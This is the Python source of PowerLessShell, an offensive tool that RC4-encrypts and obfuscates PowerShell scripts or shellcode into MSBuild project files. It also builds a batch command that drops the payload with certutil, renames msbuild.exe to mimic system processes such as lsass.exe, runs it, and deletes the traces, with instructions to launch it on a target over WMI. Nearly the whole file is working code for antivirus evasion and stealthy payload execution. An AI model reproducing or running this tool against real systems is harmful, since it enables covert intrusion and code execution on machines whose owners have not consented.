# Author: Mr.Un1k0d3r - RingZer0 Team 2017

import random
import string
import base64
import sys
import re
import os

TEMPLATE = "include/template-"
IS_CMD_ARGS = False
USE_KNOWN_PROCESS_NAME = False

class Generator:

	def __init__(self):
		self.error = 0
		self.banner()
		self.chunk_size = 1024	
		
	def clearscreen(self):
		os.system("clear")	

	def print_error(self, error):
		print "\033[91m[-] >>> %s\033[00m" % error
		
	def banner(self):
		self.clearscreen()
		print "\n\n\033[33mPowerLessShell - Remain Stealth"
		print "         More PowerShell Less Powershell.exe - Mr.Un1k0d3r RingZer0 Team\033[00m"
		print "            ___"
		print "        .-\"; ! ;\"-."
		print "      .'!  : | :  !`."
		print "     /\  ! : ! : !  /\\"
		print "    /\ |  ! :|: !  | /\\"
		print "   (  \ \ ; :!: ; / /  )"
		print "  ( `. \ | !:|:! | / .' )"
		print "  (`. \ \ \!:|:!/ / / .')"
		print "   \ `.`.\ |!|! |/,'.' /"
		print "    `._`.\\\!!!// .'_.'"
		print "       `.`.\\|//.'.'"
		print "        |`._`n'_.'|"
		print "        `----^----\"\n\n"
			
	def set_template(self, path):
		self.data = self.load_file(path, True)
		self.rand_vars()
		
	def gen_str(self, size):
		return "".join(random.SystemRandom().choice(string.ascii_uppercase + string.ascii_lowercase) for _ in range(size)) 

	def gen_process(self):
		name = ["csrss.exe","explorer.exe","iexplore.exe","firefox.exe","chrome.exe","lsass.exe","services.exe","smss.exe","spoolsv.exe","svchost.exe","winlogon.exe","wininit.exe","taskmgr.exe","conhost.exe","OUTLOOK.exe", "WINWORD.exe", "EXCEL.exe"]
		return name[random.randrange(0, len(name) - 1)]
		
	def rand_vars(self):
		for i in reversed(range(1, 100)):
			self.data = self.data.replace("VAR" + str(i), self.gen_str(random.randrange(5, 25)))
			
	def get_output(self):
		return self.data
		
	def gen_rc4_key(self, size):
		return os.urandom(size)
		
	def format_rc4_key(self, key):
		return "0x" + ", 0x".join(re.findall("..", key.encode("hex")))
		
	def capture_input(self, mod = "", index = 0):
		if IS_CMD_ARGS:
			try:
				return sys.argv[index]
			except:
				return ""
		if not mod == "":
			mod = "(%s)" % mod
		return raw_input("\n%s>>> " % mod).strip()
		
	def load_file(self, path, fatal_error = False):
		data = ""
		try:
			data = open(path, "rb").read()
		except:
			self.error = 1
			self.print_error("%s file not found." % path)
			if fatal_error:
				exit(0)
		return data
		
	def get_error(self):
		if IS_CMD_ARGS and self.error == 1:
			exit(0)
		current = self.error
		self.error = 0
		return current
		
	def gen_final_cmd(self, path):
		size = 0
		filepath = []
		filepath.append(self.gen_str(random.randrange(5, 25)))
		filepath.append(self.gen_str(random.randrange(5, 25)))
		data = self.load_file(path).encode("hex")
		
		payload = "cd C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\ && del %s && del %s && " % (filepath[0], filepath[1])
		
		for chunk in re.findall("." * self.chunk_size, data):
		        payload += "echo %s >> %s && " % (chunk, filepath[0])
		        size += self.chunk_size

		if len(data) > size:
			payload += "echo %s >> %s" % (data[(len(data) - size) * -1:], filepath[0])

		if USE_KNOWN_PROCESS_NAME:
			msbuild = self.gen_process()
		else:
			msbuild = self.gen_str(random.randrange(5, 25)) + ".exe"
		payload += " && certutil -decodehex %s %s && copy msbuild.exe %s && %s %s && del %s && del %s && del %s" % (filepath[0], filepath[1], msbuild, msbuild, filepath[1], msbuild, filepath[1], filepath[0])
		return payload
		
	def set_condition(self, data, value = ""):
		if value == "":
			return data.replace("[CONDITION]", "")
		else:
			return data.replace("[CONDITION]", ' Condition="\'$(USERDOMAIN)\'==\'%s\'"' % value)
   	@staticmethod
    	def gen_pattern(charset):	
		return ''.join(random.sample(charset,len(charset)))
	
	def gen_junk(self):
		junk = ["int", "var", "float", "decimal", "uint", "double", "long"]
		data = ""
		for i in range(0, random.randrange(1, 12)):
			data += "\t\t\t\t%s %s = %d;\r\n" % (random.choice(junk), self.gen_str(random.randrange(5, 25)), random.randrange(1, 100000))
			
		return data
class RC4:

	def KSA(self, key):
		keylength = len(key)
		S = range(256)
		j = 0
		for i in range(256):
			j = (j + S[i] + key[i % keylength]) % 256
			S[i], S[j] = S[j], S[i]
		return S
	
	def PRGA(self, S):
		i = 0
		j = 0
		while True:
			i = (i + 1) % 256
			j = (j + S[i]) % 256
			S[i], S[j] = S[j], S[i] 

			K = S[(S[i] + S[j]) % 256]
			yield K

	def Encrypt(self, plaintext, key):
		output = ""
		key = [ord(c) for c in key]
		S = self.KSA(key)
		keystream = self.PRGA(S)
		for c in plaintext:
			output = output + chr(ord(c) ^ keystream.next())
		return output	
		
if __name__ == "__main__":
	gen = Generator()
	input_name = "PowerShell script"
	data = ""
	
	if len(sys.argv) >= 4:
		IS_CMD_ARGS = True
		if "-knownprocess" in sys.argv:
			USE_KNOWN_PROCESS_NAME = True
	try:
		if gen.capture_input("Set payload type 'powershell, shellcode'", 3) == "shellcode".lower():
			input_name = "raw shellcode file"
			TEMPLATE = TEMPLATE + "shellcode.csproj"
		else:
			TEMPLATE = TEMPLATE + "powershell.csproj"

		gen.set_template(TEMPLATE)
		rc4 = RC4()
		key = gen.gen_rc4_key(32)
		
		data_path = gen.capture_input("Path to the %s" % input_name, 1)
		data = gen.load_file(data_path, False)	
		while gen.get_error():
			data_path = gen.capture_input("Path to the %s" % input_name)
			data = gen.load_file(data_path, False)
		
		outfile = gen.capture_input("Path for the generated MsBuild out file", 2)
		cipher = base64.b64encode(rc4.Encrypt(data, key))
		
		pattern1 = Generator.gen_pattern("#!@$%?&-~")
		pattern2 = Generator.gen_pattern(",.<>)(*[]{}`")	
		cipher = cipher.replace("m", pattern1).replace("V", pattern2)

		output = gen.get_output()
		output = output.replace("[KEY]", gen.format_rc4_key(key)).replace("[PAYLOAD]", cipher)
		output = output.replace("[PATTERN_1]", pattern1).replace("[PATTERN_2]", pattern2)
		output = output.replace("[JUNK1]", gen.gen_junk()).replace("[JUNK2]", gen.gen_junk()).replace("[JUNK3]", gen.gen_junk())
		condition = gen.capture_input("Set USERDOMAIN condition (Default '')", 4).strip()
		output = gen.set_condition(output, condition)
		
		try:
			open(outfile, "wb").write(output)
		except:
			gen.print_error("Failed to write the output to %s" % outfile)

		if not IS_CMD_ARGS:
			answer = gen.capture_input("Use known process name to perform MsBuild renaming (Default: False)").lower()
			if answer == "true":
				USE_KNOWN_PROCESS_NAME = True
			
		outcmd = gen.gen_final_cmd(outfile)
		try:
			open(outfile + ".bat", "wb").write(outcmd)
		except:
			gen.print_error("Failed to write the output to %s.bat" % outfile)

		print "\n\n[+] %s was generated.\n[+] %s.bat was generated.\n[+] Run the command inside of %s.bat on the target system using WMI." % (outfile, outfile, outfile)			
	except KeyboardInterrupt:
			print ""
			gen.print_error("Exiting")
			exit(0)
